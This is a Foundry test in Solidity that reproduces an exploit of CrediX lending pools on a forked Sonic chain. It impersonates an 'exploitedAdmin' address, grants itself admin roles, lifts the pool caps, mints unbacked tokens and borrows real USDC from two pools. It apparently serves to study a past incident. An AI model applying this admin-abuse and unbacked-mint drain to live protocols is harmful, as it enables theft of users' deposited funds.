pragma solidity ^0.8.20;

import "../basetest.sol";

contract CrediX_EX is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 40_687_491 - 1;
    address exploitedAdmin = 0xD3E02C92f59a0ba5601464299D658d3a0a7cf96F;

    IACLManager ACLManager = IACLManager(0x8f0431F6Adb3e81D282d0508c16e2817DC95095b);
    IConfigurator configurator1 = IConfigurator(0xc9122E191d9bDaBf9b59A31C01D4e6c4cd719E89);
    
    address USDC = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894;
    address credixUSDC = 0xEc26D07B5c0a99D3690375A2CC229E5B943e7726;

    function setUp() public {
        string memory rpcUrl = vm.envString("RPC_URL"); // sonic
        vm.createSelectFork((rpcUrl), blocknumToForkFrom);
        fundingToken = USDC;
    }

    function testExploit() public {
        // addAdmin
        vm.startPrank(exploitedAdmin);
        {
            ACLManager.addPoolAdmin(address(this));
            ACLManager.addBridge(address(this));
            ACLManager.addAssetListingAdmin(address(this));
            ACLManager.addEmergencyAdmin(address(this));
            ACLManager.addRiskAdmin(address(this));
        }
        vm.stopPrank();

        exploitPool1();
        exploitPool2();
    }

    function exploitPool1() public balanceLog() {
        IPool pool1 = IPool(0x56eb1bcB2aA011517fD7bf32641E79Bd8471770e);

        configurator1.setSupplyCap(USDC, 0);
        configurator1.setBorrowCap(USDC, 0);
        configurator1.setUnbackedMintCap(USDC, 50_000 * 1e6);

        pool1.mintUnbacked(USDC, 5_000_000 * 1e6, address(this), 0);
        IAToken(credixUSDC).approve(address(pool1), type(uint256).max);
        pool1.borrow(USDC, 500_000 * 1e6, 2, 0, address(this));
    }

    function exploitPool2() public balanceLog() {
        IPool pool2 = IPool(0x0850A9759165B25832E2cAa3dB3f2d04dc583D4E);

        IAToken(credixUSDC).approve(address(pool2), type(uint256).max);
        pool2.supply(credixUSDC, 1_000_000 * 1e6, address(this), 0);
        pool2.borrow(USDC, 290_000 * 1e6, 2, 0, address(this));
    }
}

interface IACLManager {
    function addPoolAdmin(address admin) external;
    function addEmergencyAdmin(address admin) external;
    function addRiskAdmin(address admin) external;
    function addBridge(address bridge) external;
    function addAssetListingAdmin(address admin) external;
}

interface IPool {
    function mintUnbacked(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
}

interface IConfigurator{
    function setSupplyCap(address asset, uint256 newSupplyCap) external;
    function setBorrowCap(address asset, uint256 newBorrowCap) external;
    function setUnbackedMintCap(address asset, uint256 newUnbackedMintCap) external;
}

interface IAToken{
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}